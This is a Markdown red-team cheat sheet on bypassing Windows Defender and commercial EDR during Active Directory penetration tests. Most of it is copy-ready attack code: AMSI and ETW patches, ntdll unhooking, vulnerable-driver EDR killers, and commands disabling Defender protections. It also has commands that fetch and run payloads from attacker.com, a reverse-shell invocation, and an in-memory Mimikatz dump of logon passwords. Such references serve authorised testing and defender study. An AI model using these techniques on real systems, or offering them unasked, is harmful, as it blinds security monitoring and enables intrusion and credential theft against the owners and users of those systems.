# AV/EDR Bypass Reference

Evasion techniques for Windows Defender, commercial EDR, and userland/kernel-mode protections during AD pentests.

## Decision Tree

```
┌─ What AV/EDR is present?
│  ├─ Detection methods
│  └─ Product-specific weaknesses
│
├─ Need to run .NET assembly?
│  ├─ AMSI bypass FIRST
│  └─ Execute assembly
│
├─ Need to run shellcode/unmanaged code?
│  ├─ ETW patch (blind telemetry)
│  ├─ Unhook userland (if EDR present)
│  └─ Execute loader
│
├─ Need to kill EDR?
│  ├─ BYOVD (if local admin + kernel access needed)
│  └─ Otherwise: evade, don't engage
│
└─ Constrained Language Mode (CLM)?
   ├─ CLM bypass FIRST
   └─ Proceed with PowerShell operations
```

## Detection: Enumerate AV/EDR

### Windows Defender Status

```powershell
Get-MpComputerStatus
Get-MpPreference | Select-Object -Property Exclusion*
```

### Installed Security Products

```powershell
# WMI query
WMIC /namespace:\\root\SecurityCenter2 path AntiVirusProduct GET displayName, pathToSignedProductExe

# PowerShell equivalent
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
```

### EDR Process Detection

```powershell
Get-Process | Where-Object {$_.ProcessName -match "crowd|sentinel|cylance|carbon|defender|csfalcon|sense|mssense"}

# Command-line fallback
tasklist | findstr /I "crowd sentinel cylance carbon"
```

### EDR Driver Detection

```cmd
fltmc filters
driverquery /v | findstr /I "crowd sentinel cylance carbon"
```

Common EDR drivers:
- CrowdStrike: `CsFalcon`, `csagent`
- SentinelOne: `SentinelMonitor`
- Cylance: `CyProtectDrv`
- Carbon Black: `cbstream`, `parity`
- Microsoft Defender: `WdFilter`, `MsSecFlt`

---

## AMSI Bypass

### PowerShell Reflection Method

```powershell
# Classic Matt Graeber technique
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Memory Patching (amsi.dll)

**PowerShell Version:**

```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(5)
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3), 0, $mem, 6)
$patch = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [Func[IntPtr, UInt32, IntPtr, Int32]])
$patch.Invoke([IntPtr]::Zero, 0, [IntPtr]::Zero)
```

**C# AmsiScanBuffer Patch:**

```csharp
// Patch amsi.dll!AmsiScanBuffer to always return AMSI_RESULT_CLEAN
var amsi = LoadLibrary("amsi.dll");
var addr = GetProcAddress(amsi, "AmsiScanBuffer");
var patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
VirtualProtect(addr, patch.Length, 0x40, out _);
Marshal.Copy(patch, 0, addr, patch.Length);
```

### Obfuscated Variants

```powershell
# Base64 encoded version
$a = [Ref].Assembly.GetType('System.Management.Automation.'+$([char]0x41)+$([char]0x6D)+$([char]0x73)+$([char]0x69)+'Utils')
$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# String concatenation
$var1 = 'System.Management.Automation.'
$var2 = 'AmsiUtils'
[Ref].Assembly.GetType($var1+$var2).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Online Generators

- **amsi.fail**: https://amsi.fail/ — generates obfuscated AMSI bypasses
- **AMSITrigger**: Identify which strings trigger AMSI detection

---

## ETW Patching

**Concept**: Patch `EtwEventWrite` in `ntdll.dll` to blind EDR telemetry (PowerShell ScriptBlock logging, .NET ETW events).

### PowerShell ETW Patch

```powershell
$code = @"
using System;
using System.Runtime.InteropServices;

public class EtwPatch {
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Patch() {
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
        uint old;
        VirtualProtect(etwAddr, (UIntPtr)3, 0x40, out old);
        Marshal.WriteByte(etwAddr, 0xC3); // ret
    }
}
"@
Add-Type $code
[EtwPatch]::Patch()
```

### C# EtwEventWrite Patch

```csharp
var ntdll = GetModuleHandle("ntdll.dll");
var etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
var patch = new byte[] { 0xC3 }; // ret instruction
VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out _);
Marshal.WriteByte(etwAddr, 0xC3);
```

---

## Userland Unhooking

**Concept**: EDRs hook ntdll.dll functions (e.g., `NtCreateProcess`, `NtAllocateVirtualMemory`) to monitor API calls. Unhooking restores clean syscalls.

### Fresh ntdll.dll Copy

```csharp
// Read clean ntdll.dll from disk or \KnownDlls
var ntdllPath = @"C:\Windows\System32\ntdll.dll";
var cleanNtdll = File.ReadAllBytes(ntdllPath);

// Map clean .text section over hooked ntdll in current process
var ntdllBase = GetModuleHandle("ntdll.dll");
// Parse PE headers, locate .text section
// VirtualProtect -> memcpy clean .text -> VirtualProtect restore
```

### Perun's Fart Technique

- Suspend all threads
- Unmap hooked ntdll
- Remap clean ntdll from `\KnownDlls\ntdll.dll`
- Resume threads

### Direct Syscalls

**SysWhispers3**: Generate direct syscall stubs for ntdll functions.

```asm
; Example: NtAllocateVirtualMemory direct syscall
mov r10, rcx
mov eax, 0x18  ; syscall number
syscall
ret
```

**Indirect Syscalls (HalosGate/HellsGate)**:
- Dynamically resolve syscall numbers at runtime
- Call syscall instruction without going through hooked ntdll

**When to Use**:
- Direct syscalls: when EDR hooks ntdll but doesn't monitor syscalls
- Indirect syscalls: when EDR monitors syscall instructions (rare)
- Unhooking: when you need many ntdll functions (easier than reimplementing all)

---

## BYOVD (Bring Your Own Vulnerable Driver)

**Concept**: Load a signed but vulnerable kernel driver to kill EDR processes, unload EDR drivers, or disable kernel callbacks.

### Tools

- **Terminator**: https://github.com/ZeroMemoryEx/Terminator
- **EDRKillShifter**: Multi-driver support
- **KDMapper**: Map unsigned drivers via vulnerable signed driver
- **EDRSandblast**: Dump credentials + blind EDR

### Usage Example

```cmd
# Terminator: kill EDR process by name
Terminator.exe -s CrowdStrike

# Or by PID
Terminator.exe -p 1234
```

### Vulnerable Drivers Used

- `RTCore64.sys` (MSI Afterburner)
- `gdrv.sys` (Gigabyte driver)
- `PROCEXP.sys` (Process Explorer, older versions)
- `AsrDrv103.sys`, `AsrDrv104.sys`

### When to Use

- You have **local admin**
- EDR has kernel-mode protection you can't bypass userland
- Engagement scope allows driver loading
- **HIGH NOISE**: EDR vendors detect BYOVD, use as last resort

### Detection Risk

- EDR monitors driver loads via `PsSetLoadImageNotifyRoutine`
- Known vulnerable drivers are blocked by modern EDR
- Use at end of engagement or on isolated hosts

---

## Payload Obfuscation

### Shellcode Encryption

**AES Encryption + Runtime Decryption:**

```csharp
// Encrypt shellcode offline
byte[] shellcode = { /* msfvenom payload */ };
byte[] key = GenerateRandomKey();
byte[] encrypted = AesEncrypt(shellcode, key);

// At runtime
byte[] decrypted = AesDecrypt(encrypted, key);
// Allocate RWX, copy shellcode, execute
```

**XOR Encryption:**

```csharp
byte[] Xor(byte[] data, byte key) {
    for (int i = 0; i < data.Length; i++) data[i] ^= key;
    return data;
}
```

### Shellcode Loaders

**Nim (Nimcrypt2, OffensiveNim)**:
- Low AV detection rate in 2026
- Example: `nim c -d:release --app:gui loader.nim`

**Rust (Stardust, RustPacker)**:
- Native binary, no .NET dependencies
- Built-in obfuscation and syscalls

**Go**:
- Large binary size (good for bypassing size-based sandbox heuristics)
- Cross-platform

### Process Injection Techniques

| Technique | Description | Detection Risk |
|-----------|-------------|----------------|
| **Process Hollowing** | Create suspended process, unmap memory, write shellcode, resume | Medium |
| **APC Injection** | Queue APC to thread in target process | Low (if target is legitimate process) |
| **Early Bird** | Queue APC before thread starts | Low |
| **Thread Hijacking** | Suspend thread, set RIP to shellcode, resume | Medium |
| **Reflective DLL Injection** | Load DLL from memory without touching disk | Medium |
| **Process Doppelgänging** | NTFS transaction abuse (patched in newer Windows) | N/A |
| **Module Stomping** | Overwrite legitimate DLL in memory | Low |

### Binary Padding/Bloating

```bash
# Inflate binary size to evade sandbox analysis (many sandboxes skip large files)
dd if=/dev/zero bs=1M count=50 >> payload.exe
```

---

## LOLBins (Living Off the Land)

### Download Files

```cmd
# certutil
certutil -urlcache -split -f http://attacker.com/tool.exe C:\temp\tool.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://attacker.com/tool.exe C:\temp\tool.exe

# PowerShell
powershell -c "Invoke-WebRequest -Uri http://attacker.com/tool.exe -OutFile C:\temp\tool.exe"
powershell -c "IWR -Uri http://attacker.com/tool.exe -OutFile C:\temp\tool.exe"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker.com/tool.exe','C:\temp\tool.exe')"
```

### Execute Code

```cmd
# mshta (HTML Application)
mshta http://attacker.com/payload.hta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -enc <base64>"":close")

# rundll32
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";alert(1)
rundll32.exe advpack.dll,LaunchINFSection payload.inf,DefaultInstall

# regsvr32 (Squiblydoo)
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# wmic
wmic process call create "cmd.exe /c powershell -enc <base64>"

# MSBuild.exe (bypass AppLocker)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj

# InstallUtil.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# CMSTP.exe (bypass UAC + execute)
cmstp.exe /s payload.inf
```

### Full LOLBAS Reference

https://lolbas-project.github.io/

---

## CLM (Constrained Language Mode) Bypass

### Check Current Mode

```powershell
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = unrestricted
# ConstrainedLanguage = restricted (common with AppLocker/Device Guard)
```

### Bypass: PowerShell v2 Downgrade

```cmd
powershell -version 2
# If .NET 2.0 is installed, this drops to PowerShell v2 (no AMSI, no CLM enforcement)
```

**Detection**: Check if v2 is available:

```powershell
Test-Path "C:\Windows\Microsoft.NET\Framework64\v2.0.50727\mscorlib.dll"
```

### Bypass: Custom Runspace

```csharp
// C# code to create FullLanguage runspace
var config = InitialSessionState.CreateDefault();
config.LanguageMode = PSLanguageMode.FullLanguage;
var runspace = RunspaceFactory.CreateRunspace(config);
runspace.Open();
// Execute PowerShell in this runspace
```

### Bypass: PSByPassCLM

Tool: https://github.com/padovah4ck/PSByPassCLM

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.10.10 /rport=443 PSBypassCLM.exe
```

### Combined AMSI + CLM Bypass

```powershell
# First: AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Then: CLM bypass via runspace (if you have C# execution capability)
```

---

## Windows Defender Specific

### Exclusion Abuse

```powershell
# Add exclusion path (requires admin)
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionExtension ".xyz"
Add-MpPreference -ExclusionProcess "payload.exe"

# Check current exclusions
Get-MpPreference | Select-Object -Property Exclusion*
```

### Disable Real-Time Protection

```powershell
# Requires admin
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true
```

### Disable Cloud Protection

```powershell
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent NeverSend
```

### Tamper Protection

**Problem**: Windows Defender Tamper Protection (enabled by default on Windows 10 1903+) prevents modification via PowerShell/registry.

**Bypass**:
- Use BYOVD to kill `MsMpEng.exe` (detection service)
- Or use legitimate admin tool like `DefenderControl`
- Or disable via Group Policy (if domain admin)

---

## Evasion Layer Stacking

Recommended order when executing tooling on monitored host:

```
1. AMSI Bypass          → Prevent PowerShell/.NET assembly detection
2. ETW Patch            → Blind EDR telemetry (ScriptBlock logging)
3. Userland Unhook      → Remove EDR hooks from ntdll
4. Execute Payload      → Run shellcode/assembly/tool
```

**Example: Execute Mimikatz in-memory**

```powershell
# Step 1: AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Step 2: ETW patch
# (insert ETW patch code from earlier section)

# Step 3: Load Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
```

---

## General Evasion Principles

1. **Avoid known signatures**: Obfuscate strings, encrypt payloads, use custom loaders
2. **Minimize disk writes**: Run tools in-memory (Cobalt Strike's `execute-assembly`, PowerShell cradles)
3. **Use legitimate binaries**: LOLBins blend with normal admin activity
4. **Timing**: Some EDRs ignore short-lived processes; spawn and die quickly
5. **Behavioral evasion**: Avoid suspicious patterns (e.g., `powershell -enc` from Office macro)
6. **Test before deployment**: Use ThreatCheck, DefenderCheck, AMSITrigger to identify detection signatures

---

## Tool References

| Tool | Purpose | Link |
|------|---------|------|
| **AMSITrigger** | Identify AMSI signatures in scripts | https://github.com/RythmStick/AMSITrigger |
| **ThreatCheck** | Identify AV signatures in binaries | https://github.com/rasta-mouse/ThreatCheck |
| **DefenderCheck** | Like ThreatCheck but Defender-specific | https://github.com/matterpreter/DefenderCheck |
| **SysWhispers3** | Direct syscall generator | https://github.com/klezVirus/SysWhispers3 |
| **Terminator** | BYOVD EDR killer | https://github.com/ZeroMemoryEx/Terminator |
| **OffensiveNim** | Nim tradecraft examples | https://github.com/byt3bl33d3r/OffensiveNim |
| **LOLBAS** | LOLBin reference | https://lolbas-project.github.io |
| **amsi.fail** | AMSI bypass generator | https://amsi.fail |

---

## Operational Notes

- **Test in lab first**: Unhooking/BYOVD can crash processes or trigger EDR alerts
- **Log all evasion attempts**: Document what worked for client report
- **Evasion ≠ stealth**: Many techniques are noisy; use only when necessary
- **Check for updates**: AV/EDR vendors constantly update detections; 2026 techniques may fail in 2027
- **Fallback plan**: If evasion fails, pivot to alternate attack path (e.g., abuse legitimate admin tools instead of custom payloads)

---

## See Also

- `03-credential-dumping.md` — techniques that often require evasion
- `04-lateral-movement.md` — remote execution methods with built-in evasion
- `05-persistence.md` — persistence mechanisms that evade detection
